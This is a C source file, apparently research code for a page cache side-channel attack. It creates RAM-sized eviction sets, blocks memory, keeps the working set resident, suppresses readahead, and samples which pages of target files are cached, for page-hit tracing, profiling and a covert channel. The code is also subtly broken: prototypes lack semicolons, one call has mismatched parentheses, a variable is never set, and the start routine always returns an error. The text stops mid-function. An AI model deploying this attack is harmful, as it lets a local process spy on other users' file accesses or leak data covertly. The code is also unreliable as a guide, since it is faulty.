#include "pca.h"

#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ctype.h>
#include <errno.h>
#include <pthread.h>
#ifdef __linux
#include <fcntl.h>
#include <fts.h>
#include <memory.h>
#include <semaphore.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <wait.h>
#include <zconf.h>
#include <assert.h>
#include <limits.h>
#include <linux/limits.h>
#elif defined(__WIN32)
#include "windows.h"
#endif
#include "debug.h"


/*-----------------------------------------------------------------------------
 * DEFINES
 */
// output TAGS with ANSI colors
#define PENDING "\x1b[34;1m[PENDING]\x1b[0m "
#define INFO "\x1b[34;1m[INFO]\x1b[0m "
#define EVENT "\x1b[33;1m[EVENT]\x1b[0m "
#define OK "\x1b[32;1m[OK]\x1b[0m "
#define FAIL "\x1b[31;1m[FAIL]\x1b[0m "
#define USAGE "\x1b[31;1m[USAGE]\x1b[0m "
#define WARNING "\x1b[33;1m[WARNING]\x1b[0m "

#define WS_MGR_TAG "[WS Manager] "
#define BS_MGR_TAG "[BS Manager] "
#define ES_THREAD_TAG "[ES Thread] "
#define SS_THREAD_TAG "[SS Thread] "


/*-----------------------------------------------------------------------------
 * GLOBAL VARIABLES
 */
static size_t PAGE_SIZE = 0;
static size_t TOTAL_RAM_BYTES = 0;

static int running = 0;
static int eviction_running = 0;
#ifdef _WIN32
    static char attack_exec_path[OSAL_MAX_PATH_LEN] = {0};
#endif


/*-----------------------------------------------------------------------------
 * FUNCTION PROTOTYPES
 */
static void initTargetFile(TargetFile *target_file) 
static void closeTargetFile(void *arg); 
static void closeTargetFileSuppressSetOnly(void *arg);
static void initFillUpProcess(FillUpProcess *fp);
static void closeFillUpProcess(void *arg);
static void initCachedFile(CachedFile *cached_file);
static void closeCachedFile(void *arg);
static void closeCachedFileArrayFreeOnly(void *arg);
static void closeThread(void *arg);
static int initAttackEvictionSet(AttackEvictionSet *es);
static void closeAttackEvictionSet(AttackEvictionSet *es);
static int initAttackBlockingSet(AttackBlockingSet *bs);
static void closeAttackBlockingSet(AttackBlockingSet *bs);
static int initAttackWorkingSet(AttackWorkingSet *ws);
static void closeAttackWorkingSet(AttackWorkingSet *ws);
static int initAttackSuppressSet(AttackSuppressSet *ss);
static void closeAttackSuppressSet(AttackSuppressSet *ss);
static void initPageAccessThreadESData(PageAccessThreadESData *ps_access_thread_es_data);
static void closePageAccessThreadESData(void *arg);
static void initPageAccessThreadWSData(PageAccessThreadWSData *ps_access_thread_ws_data);
static void closePageAccessThreadWSData(void *arg);
static int initAttack(Attack *attack);
static void freeAttack(Attack *attack);

static int createEvictionSet(Attack *attack);
static size_t evictTargets(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *target_evicted_arg_ptr);
static size_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr);
static size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, void *target_evicted_arg_ptr);
static int spawnESThreads(Attack *attack);
static void *pageAccessThreadES(void *arg);
static size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr, 
    size_t access_offset, size_t access_len);

static void *bsManagerThread(void *arg);
static size_t parseAvailableMem(AttackBlockingSet *bs);
static int blockRAM(AttackBlockingSet *bs, size_t fillup_size);
#ifdef _WIN32
static int blockRAMChildWindows(AttackBlockingSet *bs);
#endif
static void releaseRAMCb(void *addr, void *arg);
static void releaseRAM(AttackBlockingSet *bs, size_t release_size);

static int profileAttackWorkingSet(Attack *attack);
#ifdef _WIN32
static int profileAttackWorkingSetFolder(Attack *attack, char *folder);
#endif
static int initialProfileResidentPagesFile(Attack *attack, char *file_path); 
static void targetPagesCacheStatusReadaheadTriggerPagesSet(DynArray *target_pages, FileMapping *target_file_mapping,
    size_t ra_window_size_pages, uint8_t val);
static void targetPageCacheStatusReadaheadTriggerPagesSet(size_t offset, FileMapping *target_file_mapping, 
    size_t back_ra_trigger_window, size_t front_ra_trigger_window, uint8_t val);
static void targetPagesCacheStatusSet(DynArray *target_pages, FileMapping *target_file_mapping, uint8_t val);
static void targetSequenceCacheStatusReadaheadTriggerPagesSet(PageSequence *target_sequence, FileMapping *target_file_mapping, 
    size_t ra_window_size_pages, uint8_t val);
static void targetSequenceCacheStatusSet(PageSequence *target_sequence, FileMapping *target_file_mapping, uint8_t val);
static ssize_t fileMappingProfileResidentPageSequences(FileMapping *mapping, size_t ps_add_threshold, 
    DynArray *resident_page_sequences);
static int cachedFileProfileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold);
static int pageSeqCmp(void *node, void *data);
static size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, int use_file_api);
static void *wsManagerThread(void *arg);
static void *pageAccessThreadWS(void *arg);
static int reevaluateWorkingSet(Attack *attack);
static int reevaluateWorkingSetList(List *cached_file_list, Attack *attack);

static int spawnSuppressThreads(Attack *attack)
static int prepareSuppressSet(Attack *attack);
static int targetsHmPrepareSuppressSet(void *data, void *arg);
static void activateSS(DynArray *suppress_set, int use_file_api);
static void *suppressThread(void *arg);

static size_t getMappingCount(const unsigned char *status, size_t size_in_pages);

/*-----------------------------------------------------------------------------
 * HELPER FUNCTIONS FOR CUSTOM DATATYPES
 */
void initTargetFile(TargetFile *target_file) 
{
    initFileMapping(&target_file->mapping_);
    // can not fail, initial size is 0
    dynArrayInit(&target_file->target_pages_, sizeof(TargetPage), 0);
}

void closeTargetFile(void *arg) 
{
    TargetFile *target_file = arg;
    closeFileMapping(&target_file->mapping_);
    if(target_file->has_target_pages_)
    {
        dynArrayDestroy(&target_file->target_pages_, NULL);
    }
}

void closeTargetFileSuppressSetOnly(void *arg) 
{
    TargetFile *target_file = arg;
    dynArrayDestroy(&target_file->suppress_sequence_, NULL);
}

void initFillUpProcess(FillUpProcess *fp)
{
    memset(fp, 0, sizeof(FillUpProcess));
    fp->pid_ = -1;
}

void closeFillUpProcess(void *arg)
{
    FillUpProcess *fp = arg;

    // TODO what do to here??
    if (fp->pid_ != 0)
    {
        osal_process_kill(fp->pid_);
    }
    fp->pid_ = 0;
}

void initCachedFile(CachedFile *cached_file)
{
    memset(cached_file, 0, sizeof(CachedFile));
    initFileMapping(&cached_file->mapping_);
    // do not waste memory at initialization
    // can not fail because no memory is reserved
    dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), 0);
}

void closeCachedFile(void *arg)
{
    CachedFile *cached_file = arg;

    closeFileMapping(&cached_file->mapping_);
    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}

void closeCachedFileArrayFreeOnly(void *arg)
{
    CachedFile *cached_file = arg;

    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}

void closeThread(void *arg)
{
    pthread_t *thread = arg;

    pthread_join(*thread, NULL);
}

int initAttackEvictionSet(AttackEvictionSet *es)
{
    memset(es, 0, sizeof(AttackEvictionSet));
    initFileMapping(&es->mapping_);
    // only used if ES_USE_THREADS is defined
    if(sem_init(&es->worker_start_sem_, 0, 0) != 0)
    {
        return -1;
    }
    if(sem_init(&es->worker_join_sem_, 0, 0) != 0)
    {
        return -1;
    }
    if(!dynArrayInit(&es->access_threads_, sizeof(PageAccessThreadESData), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}

void closeAttackEvictionSet(AttackEvictionSet *es)
{
    dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);
    sem_destroy(&es->worker_start_sem_);
    sem_destroy(&es->worker_join_sem_);
    closeFileMapping(&(es->mapping_));
}

int initAttackBlockingSet(AttackBlockingSet *bs)
{
    memset(bs, 0, sizeof(AttackBlockingSet));
    if (!dynArrayInit(&bs->fillup_processes_, sizeof(FillUpProcess), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }
    if (sem_init(&bs->initialized_sem_, 0, 0) != 0)
    {
        return -1;
    }

    return 0;
}


void closeAttackBlockingSet(AttackBlockingSet *bs)
{
    dynArrayDestroy(&bs->fillup_processes_, closeFillUpProcess);
    sem_destroy(&bs->initialized_sem_);
}

int initAttackWorkingSet(AttackWorkingSet *ws)
{
    memset(ws, 0, sizeof(AttackWorkingSet));
    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadWSData), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }
    for(size_t i = 0; i < 2; i++)
    {
        listInit(&ws->resident_files_[i], sizeof(CachedFile));
        listInit(&ws->non_resident_files_[i], sizeof(CachedFile));
    }
    if(pthread_rwlock_init(&ws->ws_lists_lock_, NULL) != 0) 
    {
        return -1;
    }

    return 0;
}

void closeAttackWorkingSet(AttackWorkingSet *ws)
{
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
    for(size_t i = 0; i < 2; i++)
    {
        listDestroy(&ws->resident_files_[i], closeCachedFile);
        listDestroy(&ws->non_resident_files_[i], closeCachedFile);
    }
    pthread_rw_lock_destroy(&ws->ws_lists_lock_);
}

int initAttackSuppressSet(AttackSuppressSet *ss)
{
    memset(ss, 0, sizeof(AttackSuppressSet));
    if (!dynArrayInit(&ss->suppress_set_, sizeof(TargetFile)), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}

void closeAttackSuppressSet(AttackSuppressSet *ss)
{
    dynArrayDestroy(&ss->suppress_set_, closeTargetFileSuppressSetOnly);
}

void initPageAccessThreadESData(PageAccessThreadESData *page_access_thread_es_data)
{
    memset(page_access_thread_es_data, 0, sizeof(PageAccessThreadESData));
}

void closePageAccessThreadESData(void *arg)
{
    PageAccessThreadESData *page_access_thread_es_data = arg;
    // ensures thread stops when currently inside sem_wait
    pthread_cancel(page_access_thread_es_data->tid_);
    pthread_join(page_access_thread_es_data->tid_, NULL);
}

void initPageAccessThreadWSData(PageAccessThreadWSData *page_access_thread_ws_data)
{
    memset(page_access_thread_ws_data, 0, sizeof(PageAccessThreadWSData));
}

void closePageAccessThreadWSData(void *arg)
{
    PageAccessThreadWSData *page_access_thread_ws_data = arg;

    if (page_access_thread_ws_data->running_)
    {
        __atomic_store_n(&page_access_thread_ws_data->running_, 0, __ATOMIC_RELAXED);
        pthread_join(page_access_thread_ws_data->tid_, NULL);
    }
}

int initAttack(Attack *attack)
{
    memset(attack, 0, sizeof(Attack));

    if (initAttackEvictionSet(&attack->eviction_set_) != 0)
    {
        return -1;
    }

    if (initAttackBlockingSet(&attack->blocking_set_) != 0)
    {
        return -1;
    }

    if (initAttackWorkingSet(&attack->working_set_) != 0)
    {
        return -1;
    }

    if (initAttackSuppressSet(&attack->suppress_set_) != 0)
    {
        return -1;
    }

    if (hashMapInit(&attack->targets_, sizeof(TargetFile), 1023) != 0)
    {
        return -1;
    }

    if (!dynArrayInit(&attack->ss_threads_, sizeof(pthread_t), PCA_ARRAY_INIT_CAP))
    {
        return -1;
    }

    initFileMapping(&attack->event_obj_);

    return 0;
}

void freeAttack(Attack *attack)
{
    // join all threads and kill all processes
    if (attack->event_child_ != 0)
    {
        kill(attack->event_child_, SIGKILL);
    }
    dynArrayDestroy(&attack->ss_threads_, closeThread);
    pthread_join(attack->bs_manager_thread_, NULL);
    closeAttackBlockingSet(&attack->blocking_set_);
    pthread_join(attack->ws_manager_thread_, NULL);

    // in reverse close remaining files, unmap and free memory
    closeAttackSuppressSet(&attack->suppress_set_);
    closeAttackWorkingSet(&attack->working_set_);
    closeAttackEvictionSet(&attack->eviction_set_);
    hashMapDestroy(&attack->targets_, closeTargetFile);
    closeFileMapping(&attack->event_obj_);
}


/*-----------------------------------------------------------------------------
 * PUBLIC ATTACK FUNCTIONS
 */

// initialise attack, fetches information which stays valid
int pcaInit(Attack *attack) 
{
    int ret = 0;
    struct sysinfo system_info;

    // get system page size
    PAGE_SIZE = sysconf(_SC_PAGESIZE);
    if (PAGE_SIZE == -1)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at syscconf...\n", OSAL_EC));
        goto error;
    }

    // get system ram size
    ret = sysinfo(&system_info);
    if (ret != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at sysinfo...\n", OSAL_EC));
        goto error;
    }
    TOTAL_RAM_BYTES = system_info.totalram;

    // initialise attack structures
    if(initAttack(attack) != 0) 
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at initAttack...\n", OSAL_EC));
        goto error;
    } 

    return 0;
error:
    freeAttack(attack);
    return -1;
}

// start attack (fill structures, start threads, ...)
int pcaStart(Attack *attack, int flags)
{
    int ret = 0;

    // only windows
    // special handling of blocking and working set
#ifdef _WIN32
    if(flags & PCA_START_WIN_SPAWN_BS_CHILD)
    {
        if(blockRAMChildWindows() != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at blockRAMChildWindows...\n", OSAL_EC));
            return -1;
        }
    }
    if(flags & PCA_START_WIN_SPAWN_WS_CHILD)
    {

    }
#endif

    // profile system working set if wanted
    // done before any memory is blocked so that the whole current working set can be profiled
    if (attack->use_attack_ws_)
    {
        DEBUG_PRINT((DEBUG INFO "Profiling working set...\n"));
        if (profileAttackWorkingSet(attack) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at profileAttackWorkingSet...\n", OSAL_EC));
            goto error;
        }
        // TODO move to main
        //DEBUG_PRINT((DEBUG INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
        //       attack->working_set_.resident_files_.count_, attack->working_set_.mem_in_ws_, attack->working_set_.ps_add_threshold_);
    }

    // create + map attack eviction set
    DEBUG_PRINT((DEBUG INFO "Trying to create a %zu MB eviction set.\nThis might take a while...\n", 
        TOTAL_RAM_BYTES / 1024 / 1024));
    ret = createEvictionSet(attack);
    if (ret != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at createEvictionSet...\n", OSAL_EC));
        goto error;
    }
    // if wanted spawn eviction threads
    if(attack->eviction_set_.use_access_threads_)
    {
        if (spawnESThreads(attack) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at spawnESThreads...\n", OSAL_EC));
            goto error;
        }
    }

    // if wanted spawn readahead suppress threads
    if(attack->use_attack_ss_)
    {
        if (spawnSuppressThreads(attack) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at spawnSuppressThreads...\n", OSAL_EC));
            goto error;
        }
    }

    // start manager thread for working set
    if (attack->use_attack_ws_ && pthread_create(&attack->ws_manager_thread_, NULL, wsManagerThread, attack) != 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
    }
    
    // start manager thread for blocking set
    // done last as this blocks memory and might affect performance
    if (attack->use_attack_bs_)
    {
        if (pthread_create(&attack->bs_manager_thread_, NULL, bsManagerThread, &attack->blocking_set_) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
            goto error;
        }
        else
        {
            // wait till blocking set is initialized
            sem_wait(&attack->blocking_set_.initialized_sem_);
        }
    }

#ifdef _WIN32
    if(GetModuleFileNameA(NULL, attack_exec_path, OSAL_MAX_PATH_LEN) == 0)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at GetModuleFileNameA...\n", OSAL_EC)); 
        goto error;
    }
#endif
    // TODO
    // profile working set
    // start all threads and so on
    // ...


    // Windows -> what do we do about the attack working set???
    // best would be to keep it in new processes 
    // but how to share -> shared memory etc??


    // windows needs a second init function as some stuff there can only happen with support 
    // of the main application -> flags

error:

    return -1;
}

TargetFile *pcaAddTargetFile(Attack *attack, char *target_file_path)
{
    char target_file_path_abs[OSAL_MAX_PATH_LEN];
    TargetFile target_file;
    TargetFile *target_file_ptr = NULL;

    // get absolute path
    if(osal_fullpath(target_file_path, target_file_path_abs) == NULL)
    {
        return NULL;
    }

    // map target file and add to hash map
    initTargetFile(&target_file);
    // user can change that later
    target_file.target_file_ = 1;
    if(mapFile(&target_file.mapping_, target_file_path, FILE_ACCESS_READ | FILE_NOATIME, 
        MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
    {
        closeTargetFile(&target_file);
        return NULL;
    }
    // advise random access to avoid readahead (we dont want to change the working set)
    // if it does not work ignore
    if(adviseFileUsage(&target_file.mapping_, 0, 0, FILE_USAGE_RANDOM) != 0) 
    {
        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
    }
    target_file_ptr = hashMapInsert(&attack->targets_, target_file_path_abs, strlen(target_file_path_abs), 
        &target_file);
    if(target_file_ptr == NULL)
    {
        closeTargetFile(&target_file);
        return NULL;
    }

    return target_file_ptr;
}

int pcaAddTargetsFromFile(Attack *attack, char *targets_config_file_path)
{
    int ret = 0;
    FILE *targets_config_file = NULL;
    char *line_buffer[PCA_TARGETS_CONFIG_MAX_LINE_LENGTH] = {0};
    size_t line_length = 0;
    int parse_pages = 0;
    char current_target_path_abs[OSAL_MAX_PATH_LEN];
    TargetFile current_target_file;
    
    // open targets config file
    targets_config_file = fopen(targets_config_file_path, "r");
    if(targets_config_file == NULL) 
    {
        return -1;
    }

    // init current target file
    initTargetFile(&current_target_file);
    current_target_file.has_target_pages_ = 1;
    while(1) 
    {
        // read one line
        if(fgets(line_buffer, PCA_TARGETS_CONFIG_MAX_LINE_LENGTH, targets_config_file) == NULL)
        {
            if(feof(targets_config_file)) 
            {
                break;
            }
            else 
            {
                goto error;
            }
        }

        // check for new line character (must be in array)
        // and remove it
        if(line_buffer[line_length - 1] != '\n') 
        {
            goto error;
        }
        line_buffer[--line_length] = 0;

        // empty line -> new target file
        if(line_length == 0) 
        {
            // must be one at the point of parsing a configuration for a new target file
            if(parse_pages == 0)
            {
                goto error;
            }

            // insert processed target file
            if(hashMapInsert(&attack->targets_, current_target_path_abs, strlen(current_target_path_abs), 
                &current_target_file) == NULL)
            {
                goto error;
            }
            // init new target file
            initTargetFile(&current_target_file);
            parse_pages = 0;
        }

        if(parse_pages)
        {
            TargetPage target_page;
            int no_eviction = 0;

            if(sscanf(line_buffer, "%lx %d", &target_page.offset_, &no_eviction) != 2) 
            {
                goto error;
            }
            if(no_eviction != 0 && no_eviction != 1) 
            {
                goto error;
            }
            target_page.no_eviction_ = no_eviction;

            // check for out of bounds
            if(target_page.offset_ > current_target_file.mapping_.size_pages_) 
            {
                goto error;
            }

            // append target page to file
            if(dynArrayAppend(&current_target_file.target_pages_, &target_page) == NULL) 
            {
                DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
                goto error;
            }
        }
        else 
        {
            // get absolute path
            if(osal_fullpath(line_buffer, current_target_path_abs) == NULL)
            {
                goto error;
            }
            // map target file
            if(mapFile(&current_target_file.mapping_, current_target_path_abs, FILE_ACCESS_READ | FILE_NOATIME, 
                MAPPING_ACCESS_READ | MAPPING_SHARED) != 0) 
            {
                goto error;
            }
            // advise random access to avoid readahead (we dont want to change the working set)
            // if it does not work ignore
            if(adviseFileUsage(&target_file.mapping_, 0, 0, FILE_USAGE_RANDOM) != 0) 
            {
                DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
            }

            // parse pages next
            parse_pages = 1;
        }
    }

    goto cleanup;
error:
    ret = -1;
    dynArrayDestroy(&attack->targets_, closeTargetFile);
cleanup:
    if(targets_config_file != NULL) 
    {
        fclose(targets_config_file);
    }
    closeTargetFile(&current_target_file);

    return ret;
}

// for single page hit tracing
int pcaTargetPagesSampleFlushOnce(Attack *attack) 
{
    int ret = 0;
    ret = targetPagesSampleShouldEvict(attack);
    if(ret == -1) 
    {
        return -1;
    }
    // nothing to evict
    else if(ret == 0)
    {
        return 0;
    }
    // we should evict
    if(evictTargets(attack, targetsPagesEvicted, attack) == attack->eviction_set_.mapping_.size_) 
    {
        return -1;
    }

    return 0;
}

// for profiling
int pcaTargetFilesSampleFlushOnce(Attack *attack)
{
    int ret = 0;
    ret = targetFilesSampleShouldEvict(attack);
    if(ret == -1) 
    {
        return -1;
    }
    // nothing to evict
    else if(ret == 0)
    {
        return 0;
    }
    // we should evict
    if(evictTargets(attack, targetFilesEvicted, attack) == attack->eviction_set_.mapping_.size_) 
    {
        return -1;
    }
    return 0;
}

// for covert channel
int pcaTargetFileRangeSampleFlushOnce(Attack *attack, TargetFile *target_file)
{
    int ret = 0;
    // has to have a target sequence, else it is invalid
    if(target_file->target_sequence_ != 1)
    {
        return -1;
    }

    ret = targetFileRangeSampleShouldEvict(target_file);
    if(ret == -1) 
    {
        return -1;
    }
    // nothing to evict
    else if(ret == 0)
    {
        return 0;
    }
    // we should evict
    if(evictTargets(attack, targetFileRangeEvicted, target_file) == attack->eviction_set_.mapping_.size_) 
    {
        return -1;
    }
    return 0;
}

// teardown
void pcaExit(Attack *attack)
{
    // signal that attack execution should stop
    __atomic_store_n(&running, 0, __ATOMIC_RELAXED);
    // stop attack execution
    exitAttack(attack);
}


/*-----------------------------------------------------------------------------
 * HELPER FUNCTIONS FOR PUBLIC ATTACK FUNCTIONS
 */

// for single page hit tracing
int targetsHmPagesCacheStatusCB(void *data, void *arg)
{
    int stop_if_cached = (int) arg; 
    TargetFile *target_file = data;
    TargetPage *target_pages = target_file->target_pages_.data_;
    uint8_t status = 0;

    for(size_t i = 0; i < target_file->target_pages_.size_; i++)
    {
        if(getCacheStatusFileRange(&target_file->mapping_, target_pages[i].offset_ * PAGE_SIZE, PAGE_SIZE) != 0) 
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFileRange...\n", OSAL_EC));
            return -1;
        }
        // stop if wanted
        if(stop_if_cached &&
           target_file->mapping_.pages_cache_status_[target_pages[i].offset_] == 1)

        {
            // page is still in page cache -> stop
            return HM_FE_BREAK;
        }
    }

    return HM_FE_OK;
}

int targetsPagesEvicted(void *arg)
{
    Attack *attack = arg;
    if(hashMapForEach(&attack->targets_, targetsHmPagesCacheStatusCB, 1) == HM_FE_OK)
    {
        return 1;
    }

    return 0;
}

int targetsHmPagesShouldEvictCB(void *data, void *arg)
{
    (void) arg;
    TargetFile *target_file = data;
    TargetPage *target_pages = target_file->target_pages_.data_;

    for(size_t i = 0; i < target_file->target_pages_.size_; i++)
    {
        // evict if a page is in pc for which eviction should be triggered
        if(!target_pages[i].no_eviction_ &&
           target_file->mapping_.pages_cache_status_[target_pages[i].offset_] == 1)

        {
            return HM_FE_BREAK;
        }
    }

    return HM_FE_OK;
}

int targetPagesSampleShouldEvict(Attack * attack)
{
    // sample all pages of interest
    if(hashMapForEach(&attack->targets_, targetsHmPagesCacheStatusCB, 0) != HM_FE_OK)
    {
        return -1;
    }
    // check if eviction is needed
    if(hashMapForEach(&attack->targets_, targetsHmPagesShouldEvictCB, 0) == HM_FE_BREAK)
    {
        return 1;
    }

    return 0;
}


// for profiling
int targetsHmFilesCacheStatusCB(void *data, void *arg)
{
    int stop_if_cached = (int) arg; 
    TargetFile *target_file = data;

    if(getCacheStatusFile(&target_file->mapping_) != 0) 
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
        return -1;
    }
    if(stop_if_cached && 
        getMappingCount(target_file->mapping_.pages_cache_status_, target_file->mapping_.size_pages_) != 0)
    {
        // (part of) file is still in page cache -> stop
        return HM_FE_BREAK;
    }

    return HM_FE_OK;
}

int targetFilesEvicted(void *arg)
{
    Attack *attack = arg;
    if(hashMapForEach(&attack->targets_, targetsHmFilesCacheStatusCB, 1) == HM_FE_OK)
    {
        return 1;
    }

    return 0;
}

int targetsHmFilesShouldEvictCB(void *data, void *arg)
{
    int stop_if_cached = (int) arg; 
    TargetFile *target_file = data;

    if(getMappingCount(target_file->mapping_.pages_cache_status_, target_file->mapping_.size_pages_) != 0)
    {
        // (part of) file is still in page cache -> stop
        return HM_FE_BREAK;
    }

    return HM_FE_OK;
}

int targetFilesSampleShouldEvict(Attack *attack)
{
    // sample all pages of interest
    if(hashMapForEach(&attack->targets_, targetsHmFilesCacheStatusCB, 0) != HM_FE_OK)
    {
        return -1;
    }  
    // check if eviction is needed
    if(hashMapForEach(&attack->targets_, targetsHmFilesShouldEvictCB, 0) == HM_FE_BREAK)
    {
        return 1;
    } 

    return 0;
}


// for covert channel
int targetFileRangeCacheStatus(TargetFile *target_file)
{
    size_t offset_in_pages = target_file->target_sequence_.offset_;
    size_t length_in_pages = target_file->target_sequence_.length_;

    if(getCacheStatusFileRange(&target_file->mapping_, offset_in_pages * PAGE_SIZE, length_in_pages * PAGE_SIZE) != 0) 
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
        return -1;
    }
    if(getMappingCount(target_file->mapping_.pages_cache_status_ + offset_in_pages, length_in_pages) != 0)
    {
        // (part of) file is still in page cache -> return 1
        return 1;
    }

    // nothing in page cache
    return 0;
}

int targetFileRangeEvicted(void *arg)
{
    TargetFile *target_file = arg;
    if(targetFileRangeCacheStatus(target_file) == 0)
    {
        return 1;
    }

    return 0;
}

int targetFileRangeShouldEvict(TargetFile *target_file)
{
    size_t offset_in_pages = target_file->target_sequence_.offset_;
    size_t length_in_pages = target_file->target_sequence_.length_;

    if(getMappingCount(target_file->mapping_.pages_cache_status_ + offset_in_pages, length_in_pages) != 0)
    {
        // (part of) file is still in page cache -> return 1
        return 1;
    }

    // nothing in page cache
    return 0;
}

int targetFileRangeSampleShouldEvict(TargetFile *target_file)
{
    // sample all pages of interest
    if(targetFileRangeCacheStatus(target_file) < 0)
    {
        return -1;
    }  
    // check if eviction is needed
    if(targetFileRangeShouldEvict(target_file) == 1)
    {
        return 1;
    } 

    return 0;
}


/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK EVICTION SET
 */

// creation of evcition set
int createEvictionSet(Attack *attack)
{
    int ret = 0;

    // file eviction set
    if(!attack->eviction_set_.use_anon_memory_)
    {
        // TODO path should be absolute
        ret = createRandomFile(attack->eviction_set_.eviction_file_path_, TOTAL_RAM_BYTES);
        if (ret != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at createRandomFile...\n", OSAL_EC));
            goto error;
        }
        if (mapFile(&attack->eviction_set_.mapping_, attack->eviction_set_.eviction_file_path_, 
            FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC, 
                attack->eviction_set_.eviction_file_path_));
            goto error;
        }
    }
    else 
    {
        // anonymous eviction set
        if (mapAnon(&attack->eviction_set_.mapping_, TOTAL_RAM_BYTES, MAPPING_PRIVATE 
            | MAPPING_ACCESS_READ | MAPPING_ACCESS_WRITE | MAPPING_NORESERVE) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at mapAnon...\n", OSAL_EC));
            goto error;
        }
    }

    return 0;
error:
    closeFileMapping(&attack->eviction_set_.mapping_);
    return -1;
}

size_t evictTargets(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *target_evicted_arg_ptr) 
{
    // single thread
    if(!attack->eviction_set_.use_access_threads_)
    {
        return evictTargets_(attack, targets_evicted_fn, target_evicted_arg_ptr);
    }
    // multiple threads
    else
    {
        return evictTargetsThreads_(attack, targets_evicted_fn, target_evicted_arg_ptr);
    }
}

size_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr)
{
    ssize_t accessed_mem = 0;

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);
    accessed_mem = evictTargets__(attack, targets_evicted_fn, targets_evicted_arg_ptr, 0, attack->eviction_set_.mapping_.size_);
    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

    return accessed_mem;
}

size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, void *target_evicted_arg_ptr)
{
    size_t accessed_mem_sum = 0;

    // flag eviction running
    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);

    // resume worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        // function for eviction stop condition
        thread_data->targets_evicted_fn_ = target_evicted_fn;
        thread_data->targets_evicted_arg_ptr_ = target_evicted_arg_ptr;
        // in case of error skip
        if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
            continue;
        }
    }

    // wait for completion of the worker threads
    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
    {
        // in case of error skip
        if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
        {
            DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at sem_wait...\n", OSAL_EC));
            continue;
        }

        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
        accessed_mem_sum += thread_data->accessed_mem_;
    }

    // flag eviction done
    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);

    return accessed_mem_sum;
}

int spawnESThreads(Attack *attack)
{
    int ret = 0;
    size_t pos = 0;
